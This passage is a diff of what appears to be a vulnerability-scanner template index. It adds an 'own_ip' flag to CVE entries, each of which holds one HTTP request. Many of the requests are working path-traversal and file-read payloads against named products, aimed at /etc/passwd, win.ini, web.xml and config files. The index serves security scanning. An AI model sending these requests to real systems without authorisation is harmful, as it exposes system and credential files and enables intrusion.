+      "request": "GET {{BaseURL}}/pandora_console/attachment/pandora_chat.log.json.txt",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-8515",
@@ -5238,7 +5317,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini\u0026x=/validate.ashx?requri"
+      "request": "GET {{BaseURL}}/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini\u0026x=/validate.ashx?requri",
+      "own_ip": true
     },
     {
       "id": "CVE-2020-9043",
@@ -5359,7 +5439,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /images/..%2finfo.html HTTP/1.1"
+      "request": "GET /images/..%2finfo.html HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-20091",
@@ -5411,7 +5492,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd\u0026type=uploadfile\u0026path=anything"
+      "request": "GET {{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd\u0026type=uploadfile\u0026path=anything",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-20124",
@@ -5429,7 +5511,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2\u0026filename=../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2\u0026filename=../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-21087",
@@ -5462,7 +5545,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/manage/log/view?filename=/windows/win.ini\u0026base=../../../../../../../../../../"
+      "request": "GET {{BaseURL}}/manage/log/view?filename=/windows/win.ini\u0026base=../../../../../../../../../../",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-21307",
@@ -5511,7 +5595,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/"
+      "request": "GET {{BaseURL}}/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-21479",
@@ -5754,7 +5839,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/the-plus-addons-for-elementor-page-builder/readme.txt"
+      "request": "GET {{BaseURL}}/wp-content/plugins/the-plus-addons-for-elementor-page-builder/readme.txt",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-24212",
@@ -6217,7 +6303,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/hue/assets/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2fpasswd"
+      "request": "GET {{BaseURL}}/hue/assets/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-25899",
@@ -6374,7 +6461,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/static?/%2557EB-INF/web.xml"
+      "request": "GET {{BaseURL}}/static?/%2557EB-INF/web.xml",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-28799",
@@ -6491,7 +6579,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/AvalancheWeb/image?imageFilePath=C:/windows/win.ini"
+      "request": "GET {{BaseURL}}/AvalancheWeb/image?imageFilePath=C:/windows/win.ini",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-3129",
@@ -6577,7 +6666,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      "request": "GET {{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-32789",
@@ -6680,7 +6770,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/js/log.js"
+      "request": "GET {{BaseURL}}/js/log.js",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-33564",
@@ -6743,7 +6834,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /%u002e/WEB-INF/web.xml HTTP/1.1"
+      "request": "GET /%u002e/WEB-INF/web.xml HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-34473",
@@ -6878,7 +6970,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/jeecg-boot/sys/user/querySysUser?username=admin"
+      "request": "GET {{BaseURL}}/jeecg-boot/sys/user/querySysUser?username=admin",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-37415",
@@ -7038,7 +7131,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/?action=dzsap_download\u0026link=../../../../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/?action=dzsap_download\u0026link=../../../../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-39341",
@@ -7108,7 +7202,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/files.md5"
+      "request": "GET {{BaseURL}}/files.md5",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-41174",
@@ -7154,7 +7249,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/api/geojson?url=file:///etc/passwd"
+      "request": "GET {{BaseURL}}/api/geojson?url=file:///etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-41293",
@@ -7201,7 +7297,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/cgi-bin/broker?csftyp=classic,+ssfile1%3d/etc/passwd\u0026_SERVICE=targetservice\u0026_DEBUG=131\u0026_PROGRAM=sample.webcsf1.sas\u0026sysparm=test\u0026_ENTRY=SAMPLIB.WEBSAMP.PRINT_TO_HTML.SOURCE\u0026BG=%23FFFFFF"
+      "request": "GET {{BaseURL}}/cgi-bin/broker?csftyp=classic,+ssfile1%3d/etc/passwd\u0026_SERVICE=targetservice\u0026_DEBUG=131\u0026_PROGRAM=sample.webcsf1.sas\u0026sysparm=test\u0026_ENTRY=SAMPLIB.WEBSAMP.PRINT_TO_HTML.SOURCE\u0026BG=%23FFFFFF",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-41649",
@@ -7355,7 +7452,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/go/add-on/business-continuity/api/plugin?folderName=\u0026pluginName=../../../etc/passwd"
+      "request": "GET {{BaseURL}}/go/add-on/business-continuity/api/plugin?folderName=\u0026pluginName=../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2021-43778",
@@ -7582,7 +7680,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/index.php?rest_route=/whm/v3/themesettings"
+      "request": "GET {{BaseURL}}/index.php?rest_route=/whm/v3/themesettings",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-0288",
@@ -8214,7 +8313,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\\0"
+      "request": "GET {{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\\0",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-1391",
@@ -8234,7 +8334,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00\u0026action=1\u0026ajax=1"
+      "request": "GET {{BaseURL}}/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00\u0026action=1\u0026ajax=1",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-1439",
@@ -8557,7 +8658,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/aj.html?a=devi"
+      "request": "GET {{BaseURL}}/aj.html?a=devi",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-23347",
@@ -8573,7 +8675,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini\u0026file_name=win.ini"
+      "request": "GET {{BaseURL}}/index.php/Pan/ShareUrl/downloadSharedFile?true_path=../../../../../../windows/win.ini\u0026file_name=win.ini",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-23397",
@@ -8711,7 +8814,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/lib/icinga/icinga-php-thirdparty/etc/passwd"
+      "request": "GET {{BaseURL}}/lib/icinga/icinga-php-thirdparty/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-24816",
@@ -8830,7 +8934,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/backups-dup-lite/dup-installer/main.installer.php?is_daws=1"
+      "request": "GET {{BaseURL}}/wp-content/backups-dup-lite/dup-installer/main.installer.php?is_daws=1",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-26143",
@@ -8847,7 +8952,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /ucs/micollab/version.json HTTP/1.1"
+      "request": "GET /ucs/micollab/version.json HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-26833",
@@ -8880,7 +8986,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/photo/combine.php?type=javascript\u0026g=core-r7rules/../../../hello.php."
+      "request": "GET {{BaseURL}}/photo/combine.php?type=javascript\u0026g=core-r7rules/../../../hello.php.",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-27924",
@@ -9018,7 +9125,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/goforms/rlminfo"
+      "request": "GET {{BaseURL}}/goforms/rlminfo",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-28987",
@@ -9206,7 +9314,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-admin/admin-post.php?page=pb_backupbuddy_destinations\u0026local-destination-id=/etc/passwd\u0026local-download=/etc/passwd"
+      "request": "GET {{BaseURL}}/wp-admin/admin-post.php?page=pb_backupbuddy_destinations\u0026local-destination-id=/etc/passwd\u0026local-download=/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-31499",
@@ -9239,7 +9348,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/SAAS/t/_/;/WEB-INF/web.xml"
+      "request": "GET {{BaseURL}}/SAAS/t/_/;/WEB-INF/web.xml",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-31704",
@@ -9291,7 +9401,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/i18n/component/JS?locale=en-US"
+      "request": "GET {{BaseURL}}/i18n/component/JS?locale=en-US",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-31847",
@@ -9405,7 +9516,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/i3geo/exemplos/codemirror.php?\u0026pagina=../../../../../../../../../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/i3geo/exemplos/codemirror.php?\u0026pagina=../../../../../../../../../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-33891",
@@ -9548,7 +9660,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd"
+      "request": "GET {{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-36804",
@@ -9631,7 +9744,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/static/ueditor/php/controller.php?action=proxy\u0026remote=php://filter/convert.base64-encode/resource=/etc/passwd\u0026maxwidth=-1\u0026referer=test"
+      "request": "GET {{BaseURL}}/static/ueditor/php/controller.php?action=proxy\u0026remote=php://filter/convert.base64-encode/resource=/etc/passwd\u0026maxwidth=-1\u0026referer=test",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-38627",
@@ -9815,7 +9929,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc\u0026type=Files\u0026file=passwd"
+      "request": "GET {{BaseURL}}/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc\u0026type=Files\u0026file=passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-40843",
@@ -9944,7 +10059,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-json/download-monitor/v1/user_data"
+      "request": "GET {{BaseURL}}/wp-json/download-monitor/v1/user_data",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-45808",
@@ -9979,7 +10095,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/api/scrape/kube-system"
+      "request": "GET {{BaseURL}}/api/scrape/kube-system",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-46381",
@@ -10014,7 +10131,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/ExportReportingManager.aspx"
+      "request": "GET {{BaseURL}}/ExportReportingManager.aspx",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-47615",
@@ -10033,7 +10151,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /wp-json/lp/v1/courses/archive-course?template_path=..%2F..%2F..%2Fetc%2Fpasswd\u0026return_type=html HTTP/1.1"
+      "request": "GET /wp-json/lp/v1/courses/archive-course?template_path=..%2F..%2F..%2Fetc%2Fpasswd\u0026return_type=html HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-47945",
@@ -10048,7 +10167,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/?lang=../../thinkphp/base"
+      "request": "GET {{BaseURL}}/?lang=../../thinkphp/base",
+      "own_ip": true
     },
     {
       "id": "CVE-2022-47986",
@@ -10298,7 +10418,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /include/dialog/select_templets.php?f=form1.templetactivepath=%2ftemplets/../..\\..\\..\\ HTTP/1.1"
+      "request": "GET /include/dialog/select_templets.php?f=form1.templetactivepath=%2ftemplets/../..\\..\\..\\ HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-22463",
@@ -10496,7 +10617,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/api/index.php/v1/config/application?public=true"
+      "request": "GET {{BaseURL}}/api/index.php/v1/config/application?public=true",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-24000",
@@ -10594,7 +10716,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd\u0026fileMime=$textMime"
+      "request": "GET {{BaseURL}}/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd\u0026fileMime=$textMime",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-26256",
@@ -10612,7 +10735,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd\u0026fileMime=$textMime"
+      "request": "GET {{BaseURL}}/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd\u0026fileMime=$textMime",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-26347",
@@ -10831,7 +10955,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-admin/admin-ajax.php?action=eventon_ics_download\u0026event_id=1"
+      "request": "GET {{BaseURL}}/wp-admin/admin-ajax.php?action=eventon_ics_download\u0026event_id=1",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-28432",
@@ -10985,7 +11110,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/assets/built%2F..%2F..%2F/package.json"
+      "request": "GET {{BaseURL}}/assets/built%2F..%2F..%2F/package.json",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-32315",
@@ -11052,7 +11178,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-33629",
@@ -11135,7 +11262,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/?q=./gibbon.sql"
+      "request": "GET {{BaseURL}}/?q=./gibbon.sql",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-34659",
@@ -11182,7 +11310,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/mifs/aad/api/v2/admins/users"
+      "request": "GET {{BaseURL}}/mifs/aad/api/v2/admins/users",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-35082",
@@ -11199,7 +11328,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/mifs/asfV3/api/v2/admins/users"
+      "request": "GET {{BaseURL}}/mifs/asfV3/api/v2/admins/users",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-3519",
@@ -11294,7 +11424,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/cgi-bin/exportCfgwithpasswd"
+      "request": "GET {{BaseURL}}/cgi-bin/exportCfgwithpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-36845",
@@ -11343,7 +11474,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/.cpr/%2Fetc%2Fpasswd"
+      "request": "GET {{BaseURL}}/.cpr/%2Fetc%2Fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-37580",
@@ -11425,7 +11557,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /iclock/file?url=/../../../../../../../../../windows/win.ini HTTP/1.1"
+      "request": "GET /iclock/file?url=/../../../../../../../../../windows/win.ini HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-39026",
@@ -11473,7 +11606,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/AHT/AHT_UI/public/js/app.min.js"
+      "request": "GET {{BaseURL}}/AHT/AHT_UI/public/js/app.min.js",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-40748",
@@ -11553,7 +11687,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/common/down/file?filekey=/../../../../../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/common/down/file?filekey=/../../../../../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-41642",
@@ -11752,7 +11887,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/form-maker/readme.txt"
+      "request": "GET {{BaseURL}}/wp-content/plugins/form-maker/readme.txt",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-46732",
@@ -12018,7 +12154,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/api/v1/artifact/getArtifact?artifact_path=../../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/api/v1/artifact/getArtifact?artifact_path=../../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-6038",
@@ -12055,7 +12192,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/backups-dup-lite/tmp/"
+      "request": "GET {{BaseURL}}/wp-content/backups-dup-lite/tmp/",
+      "own_ip": true
     },
     {
       "id": "CVE-2023-6549",
@@ -12323,7 +12461,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/%2e%2e/%2e%2e/etc/passwd"
+      "request": "GET {{BaseURL}}/%2e%2e/%2e%2e/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-11305",
@@ -12388,7 +12527,8 @@
         "learnpress",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/wp-json/lp/v1/material/item-materials/1"
+      "request": "GET {{BaseURL}}/wp-json/lp/v1/material/item-materials/1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-11972",
@@ -12489,7 +12629,8 @@
         "kev",
         "vkev"
       ],
-      "request": "GET / HTTP/1.1"
+      "request": "GET / HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-1709",
@@ -12541,7 +12682,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /cslu/v1/var/logs/customer-cslu-lib-log.log HTTP/1.1"
+      "request": "GET /cslu/v1/var/logs/customer-cslu-lib-log.log HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-2053",
@@ -12557,7 +12699,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET /images.listener.php?uri=1\u0026mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd HTTP/1.1"
+      "request": "GET /images.listener.php?uri=1\u0026mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-20767",
@@ -12590,7 +12733,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /xstoremgwt/cheetahImages?imageId=..\\..\\..\\..\\windows\\win.ini HTTP/1.1"
+      "request": "GET /xstoremgwt/cheetahImages?imageId=..\\..\\..\\..\\windows\\win.ini HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-22927",
@@ -12636,7 +12780,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/static/../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/static/../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-24112",
@@ -12716,7 +12861,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/interview?i=/etc/passwd"
+      "request": "GET {{BaseURL}}/interview?i=/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-27443",
@@ -12787,7 +12933,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/login"
+      "request": "GET {{BaseURL}}/login",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-2862",
@@ -12855,7 +13002,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /?InternalDir=/../../../../windows\u0026InternalFile=win.ini HTTP/1.1"
+      "request": "GET /?InternalDir=/../../../../windows\u0026InternalFile=win.ini HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-29059",
@@ -12919,7 +13067,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/de2api/engine/getEngine;.js"
+      "request": "GET {{BaseURL}}/de2api/engine/getEngine;.js",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-3080",
@@ -12952,7 +13101,8 @@
         "disclosure",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}"
+      "request": "GET {{BaseURL}}",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-31750",
@@ -13014,7 +13164,8 @@
         "jolokia",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/api/jolokia/search/org.apache.activemq:type=Broker,*"
+      "request": "GET {{BaseURL}}/api/jolokia/search/org.apache.activemq:type=Broker,*",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-3272",
@@ -13172,7 +13323,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-content/plugins/user-meta/views/debug.php"
+      "request": "GET {{BaseURL}}/wp-content/plugins/user-meta/views/debug.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-3469",
@@ -13389,7 +13541,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/tmp/temp.db%3f.1.1.1.1a-1.css"
+      "request": "GET {{BaseURL}}/tmp/temp.db%3f.1.1.1.1a-1.css",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-38816",
@@ -13403,7 +13556,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/static/link/%2e%2e/etc/passwd"
+      "request": "GET {{BaseURL}}/static/link/%2e%2e/etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-38856",
@@ -13671,7 +13825,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/assets/../package.json"
+      "request": "GET {{BaseURL}}/assets/../package.json",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-4956",
@@ -13687,7 +13842,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      "request": "GET {{BaseURL}}/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-50334",
@@ -13832,7 +13988,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /api/get-browser-snapshot?snapshot_path=/etc/passwd HTTP/1.1"
+      "request": "GET /api/get-browser-snapshot?snapshot_path=/etc/passwd HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-53704",
@@ -13917,7 +14074,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/adama/adama/downloadService?type=1\u0026file=../../../../etc/passwd"
+      "request": "GET {{BaseURL}}/adama/adama/downloadService?type=1\u0026file=../../../../etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-56145",
@@ -14016,7 +14174,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /toolbox-resource/../serverconfig.xml HTTP/1.1"
+      "request": "GET /toolbox-resource/../serverconfig.xml HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-57728",
@@ -14032,7 +14191,8 @@
         "passive",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/allversions"
+      "request": "GET {{BaseURL}}/allversions",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-5910",
@@ -14231,7 +14391,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /index/ajax/lang?lang=../../application/database HTTP/1.1"
+      "request": "GET /index/ajax/lang?lang=../../application/database HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-7954",
@@ -14297,7 +14458,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET /.webui/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.1"
+      "request": "GET /.webui/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-8877",
@@ -14327,7 +14489,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/client/index.php%3F.php/gsb/users.php"
+      "request": "GET {{BaseURL}}/client/index.php%3F.php/gsb/users.php",
+      "own_ip": true
     },
     {
       "id": "CVE-2024-9014",
@@ -14511,7 +14674,8 @@
         "vuln",
         "kev"
       ],
-      "request": "GET /storage/t.dn?s=..%5C..%5C..%5CProgram+Files+(x86)%5CGladinet+Cloud+Enterprise%5Croot%5CWeb.config\u0026sid=1 HTTP/1.1"
+      "request": "GET /storage/t.dn?s=..%5C..%5C..%5CProgram+Files+(x86)%5CGladinet+Cloud+Enterprise%5Croot%5CWeb.config\u0026sid=1 HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-11749",
@@ -14530,7 +14694,8 @@
         "ai",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/wp-json/mcp/v1"
+      "request": "GET {{BaseURL}}/wp-json/mcp/v1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-12055",
@@ -14546,7 +14711,8 @@
         "vkev",
         "vuln"
       ],
-      "request": "GET {{BaseURL}}/hx/resources/public/$SCHEMAS$?Filename=c%3a%5cwindows%5cwin.ini"
+      "request": "GET {{BaseURL}}/hx/resources/public/$SCHEMAS$?Filename=c%3a%5cwindows%5cwin.ini",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-12480",
@@ -14650,7 +14816,8 @@
         "wpmudev",
         "vkev"
       ],
-      "request": "GET /wp-content/wphb-logs/api-debug.log HTTP/1.1"
+      "request": "GET /wp-content/wphb-logs/api-debug.log HTTP/1.1",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-14528",
@@ -14682,7 +14849,8 @@
         "vuln",
         "vkev"
       ],
-      "request": "GET {{BaseURL}}/index.php?mod=textviewer\u0026src=file:///etc/passwd"
+      "request": "GET {{BaseURL}}/index.php?mod=textviewer\u0026src=file:///etc/passwd",
+      "own_ip": true
     },
     {
       "id": "CVE-2025-1974",
@@ -14769,7 +14937,8 @@
         "vkev",
         "vuln"
       ],
